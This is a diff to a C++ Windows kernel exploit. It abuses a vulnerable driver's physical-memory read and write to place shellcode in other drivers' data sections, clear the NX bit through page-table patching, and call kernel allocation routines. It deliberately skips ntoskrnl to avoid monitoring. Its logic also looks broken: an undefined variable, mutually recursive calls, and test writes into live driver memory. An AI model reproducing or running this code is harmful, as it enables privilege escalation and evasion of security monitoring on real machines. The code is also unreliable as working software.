@@ -111,6 +111,76 @@ private:
     uint64_t kernelSize = 0;
     static constexpr uint64_t PAGE_SIZE = 0x1000;
     static constexpr uint64_t ALLOCATION_GRANULARITY = 0x10000;
+
+    // Find writable data section in loaded drivers
+    uint64_t FindWritableDataSection() {
+        std::cout << "[*] Searching for writable data section..." << std::endl;
+        
+        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+        if (!ntdll) return 0;
+        
+        typedef NTSTATUS(NTAPI* NtQuerySystemInformationFn)(
+            ULONG SystemInformationClass,
+            PVOID SystemInformation,
+            ULONG SystemInformationLength,
+            PULONG ReturnLength
+        );
+        
+        const int SystemModuleInformation = 11;
+        auto NtQuerySystemInformation = (NtQuerySystemInformationFn)GetProcAddress(
+            ntdll, "NtQuerySystemInformation");
+        if (!NtQuerySystemInformation) return 0;
+        
+        std::vector<uint8_t> buffer;
+        ULONG len = 0;
+        NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
+        buffer.resize(len);
+        if (NtQuerySystemInformation(SystemModuleInformation, buffer.data(), len, &len) != 0)
+            return 0;
+
+        auto modules = (SYSTEM_MODULE_INFORMATION*)buffer.data();
+        for (ULONG i = 0; i < modules->Count; i++) {
+            uint64_t base = (uint64_t)modules->Modules[i].ImageBase;
+            std::string path = std::string(modules->Modules[i].FullPathName);
+            
+            // Skip ntoskrnl since it's likely monitored
+            if (base == ntoskrnlBase) continue;
+
+            // Load image from disk
+            std::ifstream file(path, std::ios::binary | std::ios::ate);
+            if (!file) continue;
+            auto size = file.tellg();
+            file.seekg(0);
+            std::vector<char> fileBuffer(size);
+            if (!file.read(fileBuffer.data(), size)) continue;
+
+            auto dos = (IMAGE_DOS_HEADER*)fileBuffer.data();
+            if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
+
+            auto nt = (IMAGE_NT_HEADERS*)(fileBuffer.data() + dos->e_lfanew);
+            if (nt->Signature != IMAGE_NT_SIGNATURE) continue;
+
+            auto section = IMAGE_FIRST_SECTION(nt);
+            for (int j = 0; j < nt->FileHeader.NumberOfSections; j++) {
+                if ((strcmp((char*)section[j].Name, ".data") == 0 || 
+                     strcmp((char*)section[j].Name, ".pdata") == 0) && 
+                    (section[j].Characteristics & IMAGE_SCN_MEM_WRITE)) {
+                    uint64_t sectionVA = base + section[j].VirtualAddress;
+                    
+                    // Try to write a test pattern
+                    std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
+                    if (WritePhysicalMemory(sectionVA, testPattern.data(), testPattern.size())) {
+                        std::cout << "[+] Found writable data section in " << path 
+                                 << " at 0x" << std::hex << sectionVA << std::dec << "\n";
+                        return sectionVA;
+                    }
+                }
+            }
+        }
+        
+        std::cerr << "[-] Failed to find writable data section" << std::endl;
+        return 0;
+    }
     
     // Read physical memory using GDRV vulnerability
     bool ReadPhysicalMemory(uint64_t physAddress, void* buffer, size_t size) {
@@ -182,29 +252,20 @@ private:
     bool ExecuteKernelShellcode(const void* shellcode, size_t size, uint64_t* result = nullptr) {
         std::cout << "[*] Attempting to execute shellcode..." << std::endl;
         
-        // Try known hardcoded regions for shellcode
-        uint64_t shellcodeAddr = 0;
-        const uint64_t knownRegions[] = {
-            ntoskrnlBase + 0x100000,    // Try a bit after ntoskrnl
-            0xFFFFF80000100000,         // PTE pool region
-            0xFFFFFA8000100000,         // NonPaged pool region
-            0xFFFFF6FB40100000          // System cache region
-        };
-        
-        // Try each region until we find one that works
-        for (uint64_t region : knownRegions) {
-            if (WritePhysicalMemory(region, shellcode, size)) {
-                shellcodeAddr = region;
-                break;
-            }
-        }
-        
+        // Find writable data section for main shellcode
+        uint64_t shellcodeAddr = FindWritableDataSection();
         if (!shellcodeAddr) {
             std::cerr << "[-] Failed to find memory for shellcode" << std::endl;
             return false;
         }
 
-        // Try to make shellcode memory executable
+        // Write the shellcode
+        if (!WritePhysicalMemory(shellcodeAddr, shellcode, size)) {
+            std::cerr << "[-] Failed to write shellcode" << std::endl;
+            return false;
+        }
+
+        // Make shellcode memory executable
         if (!MakeMemoryExecutable(shellcodeAddr)) {
             std::cerr << "[-] Failed to make shellcode memory executable" << std::endl;
             return false;
@@ -219,68 +280,65 @@ private:
         };
         *(uint64_t*)(jumpShellcode + 2) = shellcodeAddr;
 
-        // Try to find space for result
-        uint64_t resultAddr = 0;
-        for (uint64_t region : knownRegions) {
-            if (region != shellcodeAddr && WritePhysicalMemory(region + 0x1000, nullptr, 8)) {
-                resultAddr = region + 0x1000;
-                break;
-            }
-        }
-        
-        if (!resultAddr) {
+        // Find writable data section for result
+        uint64_t resultAddr = FindWritableDataSection();
+        if (!resultAddr || resultAddr == shellcodeAddr) {
             std::cerr << "[-] Failed to find memory for result" << std::endl;
             return false;
         }
         *(uint64_t*)(jumpShellcode + 14) = resultAddr;
 
-        // Try to find space for jump shellcode
-        uint64_t jumpAddr = 0;
-        for (uint64_t region : knownRegions) {
-            if (region != shellcodeAddr && region + 0x2000 != resultAddr && 
-                WritePhysicalMemory(region + 0x2000, jumpShellcode, sizeof(jumpShellcode))) {
-                jumpAddr = region + 0x2000;
-                break;
-            }
+        // Clear result memory
+        if (!WritePhysicalMemory(resultAddr, nullptr, 8)) {
+            std::cerr << "[-] Failed to clear result memory" << std::endl;
+            return false;
         }
-        
-        if (!jumpAddr) {
+
+        // Find writable data section for jump shellcode
+        uint64_t jumpAddr = FindWritableDataSection();
+        if (!jumpAddr || jumpAddr == shellcodeAddr || jumpAddr == resultAddr) {
             std::cerr << "[-] Failed to find memory for jump shellcode" << std::endl;
             return false;
         }
 
-        // Try to make jump shellcode executable
+        // Write jump shellcode
+        if (!WritePhysicalMemory(jumpAddr, jumpShellcode, sizeof(jumpShellcode))) {
+            std::cerr << "[-] Failed to write jump shellcode" << std::endl;
+            return false;
+        }
+
+        // Make jump shellcode executable
         if (!MakeMemoryExecutable(jumpAddr)) {
             std::cerr << "[-] Failed to make jump shellcode executable" << std::endl;
             return false;
         }
 
-        // Execute shellcode
+        // Create exec shellcode
         uint8_t execShellcode[] = {
             0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, jumpAddr
             0xFF, 0xE0                                                    // jmp rax
         };
         *(uint64_t*)(execShellcode + 2) = jumpAddr;
 
-        // Try to find space for exec shellcode
-        uint64_t execAddr = 0;
-        for (uint64_t region : knownRegions) {
-            if (region != shellcodeAddr && region + 0x3000 != resultAddr && region + 0x3000 != jumpAddr &&
-                WritePhysicalMemory(region + 0x3000, execShellcode, sizeof(execShellcode))) {
-                execAddr = region + 0x3000;
-                break;
-            }
-        }
-        
-        if (!execAddr) {
+        // Find writable data section for exec shellcode
+        uint64_t execAddr = FindWritableDataSection();
+        if (!execAddr || execAddr == shellcodeAddr || execAddr == resultAddr || execAddr == jumpAddr) {
             std::cerr << "[-] Failed to find memory for exec shellcode" << std::endl;
             return false;
         }
 
-        // Try to make exec shellcode executable
-        if (!MakeMemoryExecutable(execAddr)) {
-            std::cerr << "[-] Failed to make exec shellcode executable" << std::endl;
+        // Write exec shellcode
+        if (!WritePhysicalMemory(execAddr, execShellcode, sizeof(execShellcode))) {
+            std::cerr << "[-] Failed to write exec shellcode" << std::endl;
             return false;
+        }
+
+        // Skip making exec shellcode executable if we're already trying to make it executable
+        if (virtualAddr != execAddr) {
+            if (!MakeMemoryExecutable(execAddr)) {
+                std::cerr << "[-] Failed to make exec shellcode executable" << std::endl;
+                return false;
+            }
         }
 
         // Read result if requested
@@ -372,14 +430,12 @@ private:
     uint64_t DirectKernelAlloc(size_t size, POOL_TYPE poolType = NonPagedPoolNx) {
         std::cout << "[*] Directly allocating " << size << " bytes via ExAllocatePool2" << std::endl;
         
-        // Try known hardcoded regions for shellcode
-        uint64_t shellcodeAddr = 0;
-        const uint64_t knownRegions[] = {
-            ntoskrnlBase + 0x100000,    // Try a bit after ntoskrnl
-            0xFFFFF80000100000,         // PTE pool region
-            0xFFFFFA8000100000,         // NonPaged pool region
-            0xFFFFF6FB40100000          // System cache region
-        };
+        // Find writable data section to use as initial memory
+        uint64_t shellcodeAddr = FindWritableDataSection();
+        if (!shellcodeAddr) {
+            std::cerr << "[-] Failed to find writable data section" << std::endl;
+            return 0;
+        }
 
         // Create shellcode to call ExAllocatePool2
         uint8_t allocShellcode[] = {
@@ -402,16 +458,22 @@ private:
         *(uint64_t*)(allocShellcode + 16) = size;                             // size
         *(uint64_t*)(allocShellcode + 36) = exAllocatePoolAddress;            // function address
 
-        // Find space for allocation shellcode
-        for (uint64_t region : knownRegions) {
-            if (WritePhysicalMemory(region, allocShellcode, sizeof(allocShellcode))) {
-                shellcodeAddr = region;
-                break;
-            }
+        // Write allocation shellcode
+        if (!WritePhysicalMemory(shellcodeAddr, allocShellcode, sizeof(allocShellcode))) {
+            std::cerr << "[-] Failed to write allocation shellcode" << std::endl;
+            return 0;
         }
 
-        if (!shellcodeAddr) {
-            std::cerr << "[-] Failed to find memory for allocation shellcode" << std::endl;
+        // Make allocation shellcode executable
+        if (!MakeMemoryExecutable(shellcodeAddr)) {
+            std::cerr << "[-] Failed to make allocation shellcode executable" << std::endl;
+            return 0;
+        }
+
+        // Find another writable section for exec shellcode
+        uint64_t execAddr = FindWritableDataSection();
+        if (!execAddr || execAddr == shellcodeAddr) {
+            std::cerr << "[-] Failed to find memory for exec shellcode" << std::endl;
             return 0;
         }
 
@@ -423,36 +485,38 @@ private:
         };
         *(uint64_t*)(execShellcode + 2) = shellcodeAddr;
 
-        // Find space for exec shellcode
-        uint64_t execAddr = 0;
-        for (uint64_t region : knownRegions) {
-            if (region != shellcodeAddr && WritePhysicalMemory(region + 0x1000, execShellcode, sizeof(execShellcode))) {
-                execAddr = region + 0x1000;
-                break;
-            }
-        }
-
-        if (!execAddr) {
-            std::cerr << "[-] Failed to find memory for exec shellcode" << std::endl;
+        // Write exec shellcode
+        if (!WritePhysicalMemory(execAddr, execShellcode, sizeof(execShellcode))) {
+            std::cerr << "[-] Failed to write exec shellcode" << std::endl;
             return 0;
         }
 
-        // Find space for result
-        uint64_t resultAddr = 0;
-        for (uint64_t region : knownRegions) {
-            if (region != shellcodeAddr && region + 0x2000 != execAddr && 
-                WritePhysicalMemory(region + 0x2000, nullptr, 8)) {
-                resultAddr = region + 0x2000;
-                break;
-            }
-        }
-
-        if (!resultAddr) {
+        // Find another writable section for result
+        uint64_t resultAddr = FindWritableDataSection();
+        if (!resultAddr || resultAddr == shellcodeAddr || resultAddr == execAddr) {
             std::cerr << "[-] Failed to find memory for result" << std::endl;
             return 0;
         }
 
         // Execute the allocation
+        if (!WritePhysicalMemory(resultAddr, nullptr, 8)) {
+            std::cerr << "[-] Failed to clear result memory" << std::endl;
+            return 0;
+        }
+
+        // Execute the shellcode
+        if (!MakeMemoryExecutable(execAddr)) {
+            std::cerr << "[-] Failed to make exec shellcode executable" << std::endl;
+            return 0;
+        }
+
+        // Execute the exec shellcode
+        if (!ExecuteKernelShellcode(execShellcode, sizeof(execShellcode))) {
+            std::cerr << "[-] Failed to execute allocation shellcode" << std::endl;
+            return 0;
+        }
+
+        // Read the allocation result
         uint64_t allocatedAddr = 0;
         if (!ReadPhysicalMemory(resultAddr, &allocatedAddr, sizeof(allocatedAddr))) {
             std::cerr << "[-] Failed to read allocation result" << std::endl;
@@ -471,15 +535,6 @@ private:
     // Make memory executable by patching its PTE
     bool MakeMemoryExecutable(uint64_t virtualAddr) {
         std::cout << "[*] Clearing NX bit for address 0x" << std::hex << virtualAddr << std::dec << std::endl;
-        
-        // Try known hardcoded regions for shellcode
-        uint64_t shellcodeAddr = 0;
-        const uint64_t knownRegions[] = {
-            ntoskrnlBase + 0x200000,    // Try a bit after ntoskrnl
-            0xFFFFF80000200000,         // PTE pool region
-            0xFFFFFA8000200000,         // NonPaged pool region
-            0xFFFFF6FB40200000          // System cache region
-        };
 
         // First, we need to get CR3 to find the page tables
         uint8_t getCR3Shellcode[] = {
@@ -487,41 +542,66 @@ private:
             0xC3                        // ret
         };
 
-        // Find space for CR3 shellcode
-        for (uint64_t region : knownRegions) {
-            if (WritePhysicalMemory(region, getCR3Shellcode, sizeof(getCR3Shellcode))) {
-                shellcodeAddr = region;
-                break;
-            }
-        }
-
+        // Find writable data section for CR3 shellcode
+        uint64_t shellcodeAddr = FindWritableDataSection();
         if (!shellcodeAddr) {
             std::cerr << "[-] Failed to find memory for CR3 shellcode" << std::endl;
             return false;
         }
 
-        // Execute CR3 shellcode
+        // Write CR3 shellcode
+        if (!WritePhysicalMemory(shellcodeAddr, getCR3Shellcode, sizeof(getCR3Shellcode))) {
+            std::cerr << "[-] Failed to write CR3 shellcode" << std::endl;
+            return false;
+        }
+
+        // Skip making CR3 shellcode executable if we're already trying to make it executable
+        if (virtualAddr != shellcodeAddr) {
+            if (!MakeMemoryExecutable(shellcodeAddr)) {
+                std::cerr << "[-] Failed to make CR3 shellcode executable" << std::endl;
+                return false;
+            }
+        }
+
+        // Create exec shellcode
         uint8_t execShellcode[] = {
             0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, shellcodeAddr
             0xFF, 0xE0                                                    // jmp rax
         };
         *(uint64_t*)(execShellcode + 2) = shellcodeAddr;
 
-        // Find space for exec shellcode
-        uint64_t execAddr = 0;
-        for (uint64_t region : knownRegions) {
-            if (region != shellcodeAddr && WritePhysicalMemory(region + 0x1000, execShellcode, sizeof(execShellcode))) {
-                execAddr = region + 0x1000;
-                break;
-            }
-        }
-
-        if (!execAddr) {
+        // Find writable data section for exec shellcode
+        uint64_t execAddr = FindWritableDataSection();
+        if (!execAddr || execAddr == shellcodeAddr) {
             std::cerr << "[-] Failed to find memory for exec shellcode" << std::endl;
             return false;
         }
 
-        // Get CR3 value
+        // Write exec shellcode
+        if (!WritePhysicalMemory(execAddr, execShellcode, sizeof(execShellcode))) {
+            std::cerr << "[-] Failed to write exec shellcode" << std::endl;
+            return false;
+        }
+
+        // Make exec shellcode executable
+        if (!MakeMemoryExecutable(execAddr)) {
+            std::cerr << "[-] Failed to make exec shellcode executable" << std::endl;
+            return false;
+        }
+
+        // Execute the shellcode to get CR3
+        if (!WritePhysicalMemory(shellcodeAddr, nullptr, 8)) {
+            std::cerr << "[-] Failed to clear CR3 result memory" << std::endl;
+            return false;
+        }
+
+        // Execute the exec shellcode
+        if (!ExecuteKernelShellcode(execShellcode, sizeof(execShellcode))) {
+            std::cerr << "[-] Failed to execute CR3 shellcode" << std::endl;
+            return false;
+        }
+
+        // Read the CR3 value
         uint64_t cr3 = 0;
         if (!ReadPhysicalMemory(shellcodeAddr, &cr3, sizeof(cr3))) {
             std::cerr << "[-] Failed to read CR3 value" << std::endl;
